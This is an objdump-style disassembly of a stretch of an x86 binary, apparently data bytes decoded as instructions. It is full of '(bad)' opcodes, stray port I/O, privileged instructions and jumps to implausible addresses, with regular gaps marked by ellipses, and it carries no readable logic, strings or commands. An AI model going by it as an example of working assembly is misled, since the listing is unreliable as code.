  41ca10:	aaa    
	...
  41ca71:	add    BYTE PTR [eax],al
  41ca73:	add    al,dh
  41ca75:	retf   0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	popa   
  41ca81:	inc    esi
  41ca82:	xor    BYTE PTR [edi],ah
  41ca84:	lods   eax,DWORD PTR ds:[esi]
  41ca85:	xor    BYTE PTR [ecx],al
  41ca87:	add    BYTE PTR ds:0xe5000001,al
  41ca8d:	mov    ah,0x15
  41ca8f:	or     BYTE PTR [ebx+0x36],0x24
  41ca93:	out    dx,al
  41ca94:	and    al,0xfc
  41ca96:	mov    al,cs:0xe32b8016
  41ca9c:	jno    0x41ca80
  41ca9e:	mov    cl,0x88
  41caa0:	sbb    al,0xe0
  41caa2:	test   al,0x30
  41caa4:	push   ecx
  41caa5:	adc    dh,ah
  41caa7:	sbb    al,0xee
  41caa9:	sbb    edx,DWORD PTR [esi]
  41caab:	(bad)  
  41caac:	and    DWORD PTR ds:0xb94be3e9,ecx
  41cab2:	mov    ?,WORD PTR [ecx]
  41cab4:	inc    eax
  41cab5:	or     esi,esp
  41cab7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cab8:	fwait
  41cab9:	out    dx,al
  41caba:	sub    bh,dh
  41cabc:	in     eax,0x5f
  41cabe:	pop    ds
  41cabf:	and    cl,0x6c
  41cac2:	lea    esp,[edx]
  41cac4:	cld    
  41cac5:	mov    al,ds:0x3fbbb6c9
  41caca:	stos   BYTE PTR es:[edi],al
  41cacb:	mov    esp,ebp
  41cacd:	push   esi
  41cace:	sub    BYTE PTR [esi],ah
  41cad0:	lods   al,BYTE PTR ds:[esi]
  41cad1:	dec    edi
  41cad2:	jne    0x41ca7f
  41cad4:	push   ebx
  41cad5:	aad    0x2
  41cad7:	inc    edx
  41cad8:	dec    edi
  41cad9:	sti    
  41cada:	jle    0x41cacf
  41cadc:	jbe    0x41ca5e
  41cade:	xor    al,0xf2
  41cae0:	mov    al,ds:0xef370c56
  41cae5:	jecxz  0x41ca8a
  41cae7:	outs   dx,BYTE PTR ds:[esi]
  41cae8:	cli    
  41cae9:	mov    al,0x6
  41caeb:	adc    dh,BYTE PTR [edx]
  41caed:	stos   BYTE PTR es:[edi],al
  41caee:	mov    al,ds:0x37754077
  41caf3:	icebp  
  41caf4:	scas   al,BYTE PTR es:[edi]
  41caf5:	pop    ebp
  41caf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41caf7:	iret   
  41caf8:	fisttp WORD PTR [esi+0x26]
  41cafb:	push   cs
  41cafc:	dec    ecx
  41cafd:	sbb    dh,cl
  41caff:	pop    esi
  41cb00:	mov    ebx,0x10b09d06
  41cb05:	aad    0x14
  41cb07:	xor    DWORD PTR [edi+0x27],ecx
  41cb0a:	fs adc bh,ah
  41cb0d:	pop    es
  41cb0e:	test   BYTE PTR [ebx+ecx*1+0x14],ah
  41cb12:	sar    BYTE PTR [ebx+0x12b43f0f],0x7b
  41cb19:	test   BYTE PTR [edi+0x3b],al
  41cb1c:	mov    dl,bl
  41cb1e:	push   ds
  41cb1f:	add    DWORD PTR [eax+edi*1+0x168303c3],edx
  41cb26:	inc    esp
  41cb27:	scas   eax,DWORD PTR es:[edi]
  41cb28:	xor    BYTE PTR [esi+0x72],ch
  41cb2b:	jg     0x41cba7
  41cb2d:	xchg   ebx,eax
  41cb2e:	pop    esi
  41cb2f:	push   cs
  41cb30:	pop    esi
  41cb31:	jmp    0x93ce621a
  41cb36:	mov    al,0x9d
  41cb38:	sub    ah,BYTE PTR [ecx-0x2b65694c]
  41cb3e:	mov    eax,0x16285e92
  41cb43:	dec    esp
  41cb44:	out    dx,eax
  41cb45:	jg     0x41cbbc
  41cb47:	mov    eax,0x53f6357c
  41cb4c:	stc    
  41cb4d:	xor    BYTE PTR [esi],bl
  41cb4f:	jno    0x41cb1d
  41cb51:	mov    ds:0x25bfbf49,al
  41cb56:	ds mov ebx,0xdd080b0c
  41cb5c:	es jecxz 0x41cb53
  41cb5f:	add    ah,al
  41cb61:	js     0x41cb25
  41cb63:	hlt    
  41cb64:	stos   BYTE PTR es:[edi],al
  41cb65:	mov    ?,WORD PTR [edi]
  41cb67:	mov    bh,0xb8
  41cb69:	pop    eax
  41cb6a:	xor    ebx,DWORD PTR ds:0x92fbcc0a
  41cb70:	mov    ebp,0x24e0afc7
  41cb75:	and    BYTE PTR [edi+0x18e9c913],dl
  41cb7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb7d:	fisubr WORD PTR [ebx+0x60a8fd36]
  41cb83:	out    dx,al
  41cb84:	leave  
  41cb85:	jp     0x41cb95
  41cb87:	aas    
  41cb88:	and    DWORD PTR ds:0x15d5d28f,0x4fd01b
	...
  41cbf2:	add    BYTE PTR [eax],al
  41cbf4:	sub    esi,edx
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0xde5d3022
  41cc03:	in     al,0xb2
  41cc05:	xor    DWORD PTR [ecx],eax
  41cc07:	add    BYTE PTR ds:0xf9000001,al
  41cc0d:	bound  edi,QWORD PTR [ebx-0x4]
  41cc10:	pop    ds
  41cc11:	aam    0xed
  41cc13:	idiv   DWORD PTR [ecx-0x60cb35ed]
  41cc19:	xchg   ecx,eax
  41cc1a:	aad    0x5d
  41cc1c:	sbb    al,0x2c
  41cc1e:	arpl   WORD PTR [ebx],si
  41cc20:	scas   eax,DWORD PTR es:[edi]
  41cc21:	dec    eax
  41cc22:	push   ebp
  41cc23:	mov    al,ds:0xac526482
  41cc28:	sbb    dl,dl
  41cc2a:	adc    al,0x45
  41cc2c:	sbb    eax,0x34bceaf0
  41cc31:	xchg   edx,eax
  41cc32:	push   ebp
  41cc33:	mov    ah,0x1c
  41cc35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc36:	dec    esp
  41cc37:	jb     0x41cc4c
  41cc39:	ins    BYTE PTR es:[edi],dx
  41cc3a:	int3   
  41cc3b:	imul   ebx,ebp,0xffffffab
  41cc3e:	icebp  
  41cc3f:	push   eax
  41cc40:	mov    ecx,0x37bbcb67
  41cc45:	addr16 out 0x9b,al
  41cc48:	cmp    DWORD PTR [edi+0x2a9c637b],ecx
  41cc4e:	jno    0x41cc9e
  41cc50:	pop    ds
  41cc51:	sub    cl,BYTE PTR [edi]
  41cc53:	fidiv  DWORD PTR [ebp+0x9]
  41cc56:	mov    ch,0x15
  41cc58:	(bad)  
  41cc59:	jno    0x41cbfc
  41cc5b:	int3   
  41cc5c:	mov    ds:0x3c21958c,eax
  41cc61:	xchg   ebp,eax
  41cc62:	out    0x94,eax
  41cc64:	je     0x41cce4
  41cc66:	xchg   BYTE PTR [edi+0x4286cc61],dh
  41cc6c:	pop    esp
  41cc6d:	jmp    0x133b:0x7e8117c7
  41cc74:	sti    
  41cc75:	into   
  41cc76:	xchg   esi,eax
  41cc77:	xchg   DWORD PTR ds:0xf99dce36,edi
  41cc7d:	or     al,0x39
  41cc7f:	pop    ebp
  41cc80:	ss fwait
  41cc82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc83:	add    al,0xaa
  41cc85:	or     cl,BYTE PTR [ecx+0x20]
  41cc88:	inc    ecx
  41cc89:	mov    ds,WORD PTR [eax+0x2f4909d4]
  41cc8f:	mov    esi,0x23688a11
  41cc94:	int3   
  41cc95:	push   esp
  41cc96:	lahf   
  41cc97:	adc    eax,0xe129f593
  41cc9c:	jb     0x41cce9
  41cc9e:	fsubrp st(0),st
  41cca0:	retf   
  41cca1:	push   esi
  41cca2:	mov    esi,DWORD PTR [eax+edi*4+0x6d505398]
  41cca9:	mov    ebx,0x176b59e8
  41ccae:	adc    esi,0xffffffa7
  41ccb1:	and    al,0xf3
  41ccb3:	or     eax,0x15891380
  41ccb8:	in     al,dx
  41ccb9:	cmp    bl,BYTE PTR [esi-0x76308cc8]
  41ccbf:	int3   
  41ccc0:	inc    DWORD PTR [ebp-0x33]
  41ccc3:	push   ds
  41ccc4:	std    
  41ccc5:	cs (bad) 
  41ccc7:	shr    BYTE PTR [ecx],0xeb
  41ccca:	ror    DWORD PTR [ecx+0x54],cl
  41cccd:	add    DWORD PTR [esi+ecx*2-0x52],ecx
  41ccd1:	add    al,0x45
  41ccd3:	aas    
  41ccd4:	mov    al,0x62
  41ccd6:	popf   
  41ccd7:	mov    bl,0xa1
  41ccd9:	jp     0x41cc79
  41ccdb:	sub    BYTE PTR [edx-0x5316cb47],al
  41cce1:	outs   dx,BYTE PTR ds:[esi]
  41cce2:	aam    0xb8
  41cce4:	scas   al,BYTE PTR es:[edi]
  41cce5:	popa   
  41cce6:	add    ah,al
  41cce8:	in     eax,dx
  41cce9:	sbb    eax,0x5939d5fc
  41ccee:	vpshaw xmm6,[ebx],xmm0
  41ccf3:	and    BYTE PTR [eax+0x555cb0fc],bh
  41ccf9:	aaa    
  41ccfa:	pop    edx
  41ccfb:	add    al,0x6a
  41ccfd:	loopne 0x41ccf6
  41ccff:	cdq    
  41cd00:	sbb    al,0x98
  41cd02:	cli    
  41cd03:	inc    esi
  41cd04:	jns    0x41cd03
  41cd06:	mov    ecx,0xcee8c6f9
  41cd0b:	mov    al,0x6d
  41cd0d:	mov    ebx,0x3c76b3
	...
  41cd72:	add    BYTE PTR [eax],al
  41cd74:	pusha  
  41cd75:	cdq    
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	push   ds
  41cd81:	pop    ds
  41cd82:	push   ss
  41cd83:	je     0x41cd3c
  41cd85:	xor    al,BYTE PTR [ecx]
  41cd87:	add    BYTE PTR ds:0x8a000001,al
  41cd8d:	mov    eax,0x96061e2e
  41cd92:	stc    
  41cd93:	pop    ebx
  41cd94:	and    al,0x2
  41cd96:	jg     0x41cdf4
  41cd98:	aad    0x14
  41cd9a:	idiv   edi
  41cd9c:	mov    dl,0x67
  41cd9e:	shr    BYTE PTR [edi-0x6c624603],cl
  41cda4:	sahf   
  41cda5:	sub    al,0xc9
  41cda7:	dec    edi
  41cda8:	xchg   edx,eax
  41cda9:	mov    cl,0xd0
  41cdab:	fistp  WORD PTR [ebx+edi*2-0x25]
  41cdaf:	push   edi
  41cdb0:	ror    BYTE PTR [edi+0x28],1
  41cdb3:	pop    eax
  41cdb4:	data16 jp 0x41cd72
  41cdb7:	push   es
  41cdb8:	xor    DWORD PTR [edi],ebp
  41cdba:	leave  
  41cdbb:	lahf   
  41cdbc:	mov    WORD PTR [ecx],ss
  41cdbe:	call   0x3183:0x84e58db3
  41cdc5:	in     al,dx
  41cdc6:	stos   DWORD PTR es:[edi],eax
  41cdc7:	test   al,0x48
  41cdc9:	xchg   DWORD PTR [ebp+0x2c83c683],ebp
  41cdcf:	cs jmp 0xe09:0xba3f7cf2
  41cdd7:	mov    ecx,0xb2c6fa30
  41cddc:	sub    al,al
  41cdde:	pop    es
  41cddf:	hlt    
  41cde0:	mov    BYTE PTR [edi],ch
  41cde2:	sbb    ah,BYTE PTR [eax+0x12]
  41cde5:	jns    0x41ce24
  41cde7:	ret    
  41cde8:	or     al,0x39
  41cdea:	xor    BYTE PTR [ebx+eiz*4+0x76],bl
  41cdee:	mov    al,ds:0x1303abad
  41cdf3:	mov    bh,0x43
  41cdf5:	or     BYTE PTR [edi+0x62],bh
  41cdf8:	fild   WORD PTR [edi]
  41cdfa:	jge    0x41ce53
  41cdfc:	or     esp,esp
  41cdfe:	gs jns 0x41ce61
  41ce01:	adc    esi,eax
  41ce03:	sahf   
  41ce04:	jle    0x41ce68
  41ce06:	not    DWORD PTR [edi]
  41ce08:	adc    BYTE PTR [ecx-0x290d1953],ah
  41ce0e:	scas   al,BYTE PTR es:[edi]
  41ce0f:	bound  ebx,QWORD PTR [edx]
  41ce11:	push   ds
  41ce12:	popa   
  41ce13:	xor    BYTE PTR [ecx+0x1f],cl
  41ce16:	addr16 mov dh,0xe2
  41ce19:	pop    eax
  41ce1a:	rol    BYTE PTR [esi+0x35],1
  41ce1d:	sbb    edx,DWORD PTR [edx]
  41ce1f:	ins    BYTE PTR es:[edi],dx
  41ce20:	inc    ebp
  41ce21:	sbb    al,0xfd
  41ce23:	or     BYTE PTR [esi],dl
  41ce25:	scas   al,BYTE PTR es:[edi]
  41ce26:	mov    ecx,0x4322124
  41ce2b:	mov    fs,ebx
  41ce2d:	mov    esp,0xd15a90ac
  41ce32:	int3   
  41ce33:	pop    esp
  41ce34:	adc    eax,0x988b533e
  41ce39:	das    
  41ce3a:	aam    0xbf
  41ce3c:	out    0x7d,eax
  41ce3e:	jno    0x41ce69
  41ce40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce41:	inc    esi
  41ce42:	adc    eax,0x69f14981
  41ce47:	aaa    
  41ce48:	pop    edx
  41ce49:	adc    ebx,ebx
  41ce4b:	pop    ds
  41ce4c:	int    0x46
  41ce4e:	pop    esi
  41ce4f:	not    edi
  41ce51:	xor    al,0x75
  41ce53:	mov    ch,0x3d
  41ce55:	pop    ecx
  41ce56:	jne    0x41cece
  41ce58:	pop    es
  41ce59:	and    DWORD PTR [eax-0x5c7236e8],ecx
  41ce5f:	cmp    al,0x95
  41ce61:	stos   DWORD PTR es:[edi],eax
  41ce62:	cs fucomp st(0)
  41ce65:	and    ecx,esi
  41ce67:	mov    DWORD PTR [edi],ebp
  41ce69:	mov    bl,0xe2
  41ce6b:	push   eax
  41ce6c:	xlat   BYTE PTR ds:[ebx]
  41ce6d:	push   edi
  41ce6e:	hlt    
  41ce6f:	jmp    0x41ce1e
  41ce71:	mov    al,0xbd
  41ce73:	push   es
  41ce74:	scas   al,BYTE PTR es:[edi]
  41ce75:	mov    ds:0xbb40a6d4,eax
  41ce7a:	and    al,0xf2
  41ce7c:	mov    eax,0xfb9c4131
  41ce81:	add    ebx,DWORD PTR [edx+0x42]
  41ce84:	push   ecx
  41ce85:	lock mov ah,0x9
  41ce88:	sbb    cl,BYTE PTR [esi+0x29a671b0]
  41ce8e:	push   0xb890
	...
  41cef3:	add    BYTE PTR [edi],al
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	inc    edx
  41cf01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf02:	adc    eax,0x133bc04
  41cf07:	add    BYTE PTR ds:0xe4000001,al
  41cf0d:	data16 ja 0x41cf1b
  41cf10:	lds    eax,FWORD PTR ds:[esi]
  41cf13:	(bad)  
  41cf15:	js     0x41cf2e
  41cf17:	xor    eax,0xb273c7f5
  41cf1c:	shl    BYTE PTR ds:0x515d7704,0xeb
  41cf23:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41cf25:	outs   dx,DWORD PTR ds:[esi]
  41cf26:	fisttp WORD PTR [edi+0x79959bcf]
  41cf2c:	mov    ds:0x757910fd,eax
  41cf31:	add    dl,ah
  41cf33:	dec    edi
  41cf34:	jno    0x41cfab
  41cf36:	inc    esi
  41cf37:	out    dx,eax
  41cf38:	rol    BYTE PTR [edi+ebp*2],cl
  41cf3b:	(bad)  
  41cf3c:	sti    
  41cf3d:	jl     0x41cf4a
  41cf3f:	test   cl,dh
  41cf41:	outs   dx,DWORD PTR ds:[esi]
  41cf42:	jne    0x41cf9a
  41cf44:	(bad)  
  41cf45:	push   edx
  41cf46:	fld    DWORD PTR [eax-0x795ad1f3]
  41cf4c:	jb     0x41cf44
  41cf4e:	push   esp
  41cf4f:	div    BYTE PTR [esi-0x3d]
  41cf52:	dec    ecx
  41cf53:	(bad)  
  41cf54:	jo     0x41cf9d
  41cf56:	arpl   WORD PTR [edx-0x6bef042d],si
  41cf5c:	ja     0x41cf50
  41cf5e:	je     0x41cfb9
  41cf60:	popf   
  41cf61:	int3   
  41cf62:	jl     0x41cf05
  41cf64:	in     al,0xb0
  41cf66:	mov    BYTE PTR [ebx-0x785aa32e],bh
  41cf6c:	cld    
  41cf6d:	jno    0x41cfd1
  41cf6f:	in     eax,0x83
  41cf71:	popa   
  41cf72:	xor    esp,DWORD PTR [ebp-0x67]
  41cf75:	xchg   ecx,eax
  41cf76:	popf   
  41cf77:	je     0x41cf58
  41cf79:	cli    
  41cf7a:	jecxz  0x41cf39
  41cf7c:	loop   0x41cf0a
  41cf7e:	stos   BYTE PTR es:[edi],al
  41cf7f:	rcr    DWORD PTR [ebp-0x47],0xbe
  41cf83:	or     eax,DWORD PTR [edx+0x5f]
  41cf86:	fsub   DWORD PTR [eax-0x2b08c973]
  41cf8c:	fnsetpm(287 only) 
  41cf8e:	jecxz  0x41cfae
  41cf90:	repz test eax,0xa838ea02
  41cf96:	inc    ebp
  41cf97:	cmc    
  41cf98:	sbb    ch,BYTE PTR [edi]
  41cf9a:	jecxz  0x41cfcd
  41cf9c:	inc    esi
  41cf9d:	stos   BYTE PTR es:[edi],al
  41cf9e:	dec    ebp
  41cf9f:	daa    
  41cfa0:	add    al,0x66
  41cfa2:	aad    0x7e
  41cfa4:	xor    BYTE PTR [ecx],al
  41cfa6:	fs retf 0x291a
  41cfaa:	cmp    DWORD PTR [edx],esi
  41cfac:	mov    bl,0x37
  41cfae:	xchg   ebx,eax
  41cfaf:	sub    edi,DWORD PTR ds:0x1d25da0d
  41cfb5:	adc    bh,BYTE PTR [edi+0x34e19e36]
  41cfbb:	arpl   WORD PTR [ebp+eiz*8+0x576bad85],si
  41cfc2:	mov    ebp,ebx
  41cfc4:	fild   QWORD PTR [ecx+0x4370f7e4]
  41cfca:	outs   dx,BYTE PTR ds:[esi]
  41cfcb:	or     al,0x45
  41cfcd:	(bad)  
  41cfce:	sbb    BYTE PTR [eax-0x3d],dl
  41cfd1:	sub    ebx,DWORD PTR [ebp-0x5b654447]
  41cfd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfd8:	stos   DWORD PTR es:[edi],eax
  41cfd9:	adc    DWORD PTR [ebp-0x46a03c36],edi
  41cfdf:	lahf   
  41cfe0:	jnp    0x41cfb7
  41cfe2:	jp     0x41d03d
  41cfe4:	mov    eax,ds:0xd2110fc8
  41cfe9:	push   ss
  41cfea:	clc    
  41cfeb:	fbld   TBYTE PTR [eax]
  41cfed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfee:	fimul  WORD PTR [ecx-0x18d86741]
  41cff4:	and    eax,0x7dbba6b8
  41cff9:	ror    BYTE PTR [eax-0x14],cl
  41cffc:	or     DWORD PTR [eax+ebp*2-0x6],eax
  41d000:	imul   esi,DWORD PTR [edi-0x686cc092],0x40c1550e
  41d00a:	test   DWORD PTR [edi],esp
  41d00c:	cld    
  41d00d:	fdiv   st(4),st
  41d00f:	loop   0x41cfbc
	...
  41d071:	add    BYTE PTR [eax],al
  41d073:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0x27cbf4bd
  41d083:	pop    ebx
  41d084:	shl    DWORD PTR [ecx+eax*1],0x0
  41d088:	add    eax,0x1d000001
  41d08d:	xchg   ebp,eax
  41d08e:	or     BYTE PTR [ebp-0xe56f523],0x6e
  41d095:	ds jge 0x41d085
  41d098:	scas   al,BYTE PTR es:[edi]
  41d099:	test   DWORD PTR [ebx-0x163e6ec1],ecx
  41d09f:	std    
  41d0a0:	dec    esp
  41d0a1:	rcr    DWORD PTR [esi+0x2e86cafb],0x99
  41d0a8:	pushf  
  41d0a9:	or     bh,BYTE PTR [esi-0x3a]
  41d0ac:	(bad)  
  41d0ae:	in     eax,dx
  41d0af:	mov    cl,0xe7
  41d0b1:	push   edx
  41d0b2:	xor    BYTE PTR [edi+0x19d05f18],al
  41d0b8:	add    edi,DWORD PTR [ebx]
  41d0ba:	(bad)  
  41d0bb:	add    esi,DWORD PTR [ecx+0x7f07f6e]
  41d0c1:	xchg   DWORD PTR [eax-0x34945400],ebx
  41d0c7:	or     ah,0xe7
  41d0ca:	shr    BYTE PTR [eax*2-0x3cfeba7a],1
  41d0d1:	mov    edi,0x2126aa64
  41d0d6:	and    DWORD PTR [ebx-0x49dd2abe],edi
  41d0dc:	add    eax,0x9dcbe26
  41d0e1:	mov    es,WORD PTR [esi]
  41d0e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0e4:	jge    0x41d09e
  41d0e6:	call   0xf9357d0c
  41d0eb:	fcomp  DWORD PTR [eax+0x6e056210]
  41d0f1:	cmp    BYTE PTR [esi-0x6e],dl
  41d0f4:	xor    eax,0xf34a4a05
  41d0f9:	jo     0x41d108
  41d0fb:	add    ch,bh
  41d0fd:	aam    0x1
  41d0ff:	mov    dh,0x8d
  41d101:	retf   0x5db7
  41d104:	sub    eax,DWORD PTR [edi]
  41d106:	sbb    cl,BYTE PTR [eax]
  41d108:	fs dec edi
  41d10a:	mov    esi,0x2985b263
  41d10f:	and    eax,0xdd376512
  41d114:	leave  
  41d115:	push   esp
  41d116:	cdq    
  41d117:	mov    dl,BYTE PTR [eax]
  41d119:	int3   
  41d11a:	mov    dl,0x7e
  41d11c:	mov    DWORD PTR [ecx],ebp
  41d11e:	int    0x4
  41d120:	push   ebp
  41d121:	ror    DWORD PTR [esi-0x43],0x93
  41d125:	jecxz  0x41d153
  41d127:	pop    esp
  41d128:	pop    ss
  41d129:	repz out dx,eax
  41d12b:	jecxz  0x41d19c
  41d12d:	jecxz  0x41d18f
  41d12f:	xor    DWORD PTR [edx+0x1e],0xffffffc8
  41d133:	dec    edx
  41d134:	push   0x4813b163
  41d139:	ins    DWORD PTR es:[edi],dx
  41d13a:	mov    ebp,0x664dae8d
  41d13f:	ror    BYTE PTR [ecx],1
  41d141:	sub    cl,BYTE PTR [ebp+ebp*2-0x15099ae4]
  41d148:	jge    0x41d0e8
  41d14a:	aam    0x11
  41d14c:	cwde   
  41d14d:	xor    BYTE PTR [edx-0x231c760],bl
  41d153:	push   eax
  41d154:	stos   DWORD PTR es:[edi],eax
  41d155:	loop   0x41d1c7
  41d157:	imul   ecx,DWORD PTR [edi-0x16d5f0a7],0xf
  41d15e:	das    
  41d15f:	pop    esi
  41d160:	dec    DWORD PTR [ecx-0x7e]
  41d163:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d164:	inc    esp
  41d165:	jge    0x41d158
  41d167:	add    BYTE PTR [eax-0x46],0xf9
  41d16b:	and    al,0xca
  41d16d:	imul   ebp,ebx,0xffffffc6
  41d170:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d171:	xchg   edi,eax
  41d172:	dec    edx
  41d173:	pop    esi
  41d174:	adc    eax,0x790992d
  41d179:	mov    ds:0xb6eae46b,al
  41d17e:	fcmovb st,st(6)
  41d180:	outs   dx,DWORD PTR ds:[esi]
  41d181:	cs dec edx
  41d183:	outs   dx,DWORD PTR ds:[esi]
  41d184:	cdq    
  41d185:	imul   esi,DWORD PTR [ebx],0xffffffea
  41d188:	jbe    0x41d184
  41d18a:	test   BYTE PTR [ebx],bl
  41d18c:	pop    edx
  41d18d:	nop
  41d18e:	jae    0x41d1b6
  41d190:	lds    eax,FWORD PTR [eax]
	...
  41d1f2:	add    BYTE PTR [eax],al
  41d1f4:	push   eax
  41d1f5:	ret    
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	jmp    0x41d19f
  41d202:	jne    0x41d227
  41d204:	(bad)  
  41d205:	xor    eax,0x1050001
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	ret    0xb3ba
  41d20f:	(bad)  
  41d210:	cmp    esp,edi
  41d212:	inc    edi
  41d213:	pop    esi
  41d214:	jecxz  0x41d258
  41d216:	inc    esi
  41d217:	retf   
  41d218:	lods   al,BYTE PTR ds:[esi]
  41d219:	inc    ebp
  41d21a:	in     eax,0x9b
  41d21c:	add    BYTE PTR [esi-0x4a],bh
  41d21f:	ret    0xb931
  41d222:	jg     0x41d25b
  41d224:	push   ebx
  41d225:	lahf   
  41d226:	xor    BYTE PTR [esi+0x3d5a7205],cl
  41d22c:	call   DWORD PTR [ecx]
  41d22e:	js     0x41d1c0
  41d230:	in     eax,0xb5
  41d232:	sbb    al,0x21
  41d234:	imul   eax,eax,0x27
  41d237:	cwde   
  41d238:	fcomp  QWORD PTR [edi+0x10]
  41d23b:	out    dx,eax
  41d23c:	xor    al,0x52
  41d23e:	gs inc edi
  41d240:	(bad)  ds:[ecx-0x7b]
  41d244:	ret    0x4c07
  41d247:	jo     0x41d262
  41d249:	or     BYTE PTR [edx+0xb],dl
  41d24c:	call   0xba39b4f4
  41d251:	sbb    eax,0x12b960fa
  41d256:	mov    dh,0xce
  41d258:	es das 
  41d25a:	jle    0x41d299
  41d25c:	xor    al,0xb1
  41d25e:	scas   al,BYTE PTR es:[edi]
  41d25f:	jns    0x41d21f
  41d261:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d262:	in     eax,0x1
  41d264:	push   esp
  41d265:	add    bh,BYTE PTR [ebx-0x8]
  41d268:	call   esp
  41d26a:	mov    edx,0x86e11a0c
  41d26f:	mov    bl,dl
  41d271:	jne    0x41d2d5
  41d273:	ds enter 0x5041,0x1
  41d278:	sub    bl,BYTE PTR [esi+ebx*8-0x6]
  41d27c:	and    dh,dh
  41d27e:	(bad)  
  41d27f:	pop    ebp
  41d280:	xchg   ecx,eax
  41d281:	shl    DWORD PTR [ebp-0x12b4e917],cl
  41d287:	cwde   
  41d288:	(bad)  
  41d289:	aas    
  41d28a:	sar    BYTE PTR ds:0xdf1387f4,cl
  41d290:	mov    dl,0x7f
  41d292:	mov    eax,0x6ea87696
  41d297:	popa   
  41d298:	xchg   ecx,eax
  41d299:	add    BYTE PTR [edx-0x3ea4a137],ah
  41d29f:	addr16 mov edx,0x29ff2ba9
  41d2a5:	cmp    bh,BYTE PTR [ebp-0x6c935a8c]
  41d2ab:	in     eax,0x4d
  41d2ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2ae:	or     eax,0x1701e5b0
  41d2b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2b4:	cmp    ah,dh
  41d2b6:	mov    ah,0xf4
  41d2b8:	out    dx,eax
  41d2b9:	rcr    BYTE PTR [ebp+ebp*8-0x1b62e03c],0xa7
  41d2c1:	outs   dx,DWORD PTR ds:[esi]
  41d2c2:	gs inc ebx
  41d2c4:	ror    esi,0xcc
  41d2c7:	popf   
  41d2c8:	sbb    ecx,DWORD PTR [eax+0x4092bb0]
  41d2ce:	(bad)  
  41d2cf:	out    dx,al
  41d2d0:	jmp    0x964cabe3
  41d2d5:	retf   0x333b
  41d2d8:	(bad)  
  41d2d9:	mov    DWORD PTR [eax+0xb7800b8],eax
  41d2df:	add    dh,BYTE PTR [ebp-0x310fa043]
  41d2e5:	dec    ecx
  41d2e6:	dec    ebx
  41d2e7:	mov    bh,0xbc
  41d2e9:	popa   
  41d2ea:	into   
  41d2eb:	adc    al,0x64
  41d2ed:	pop    edi
  41d2ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2ef:	js     0x41d35b
  41d2f1:	das    
  41d2f2:	out    dx,eax
  41d2f3:	add    dh,BYTE PTR [ebp+0x6b]
  41d2f6:	inc    ebx
  41d2f7:	add    DWORD PTR [esi+esi*8+0x521a966a],0x4acaf6ca
  41d302:	xor    eax,0x10b0c2af
  41d307:	fnsave [edi-0x2f5242f4]
  41d30d:	and    BYTE PTR [ebx-0x4],dl
  41d310:	mov    dh,0x0
	...
  41d372:	add    BYTE PTR [eax],al
  41d374:	inc    BYTE PTR [eax+0x7dff54f9]
  41d37a:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d380:	daa    
  41d381:	xor    al,0xf3
  41d383:	test   eax,0x136cb
  41d388:	add    eax,0x99000001
  41d38d:	loope  0x41d32d
  41d38f:	mov    edx,0x436c298b
  41d394:	jb     0x41d31b
  41d396:	adc    bh,dh
  41d398:	in     eax,dx
  41d399:	mov    dl,0x85
  41d39b:	in     al,dx
  41d39c:	fsub   QWORD PTR [ecx+0x8]
  41d39f:	sub    eax,0xac4330ec
  41d3a4:	loopne 0x41d35c
  41d3a6:	sbb    edx,edi
  41d3a8:	lock cmp eax,0x24d37174
  41d3ae:	jns    0x41d352
  41d3b0:	xchg   ecx,eax
  41d3b1:	pusha  
  41d3b2:	add    BYTE PTR [bp+di],bl
  41d3b5:	pop    edi
  41d3b6:	xchg   ebx,eax
  41d3b7:	mov    ah,0x59
  41d3b9:	ds jnp 0x41d348
  41d3bc:	loopne 0x41d426
  41d3be:	xchg   di,ax
  41d3c0:	fldcw  WORD PTR [ecx-0x28bd9d52]
  41d3c6:	ds out dx,eax
  41d3c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3c9:	pop    esi
  41d3ca:	adc    DWORD PTR [edi],eax
  41d3cc:	in     al,0x5b
  41d3ce:	inc    ebp
  41d3cf:	push   ebx
  41d3d0:	outs   dx,DWORD PTR es:[esi]
  41d3d2:	add    eax,0x8b371257
  41d3d7:	inc    si
  41d3d9:	push   cs
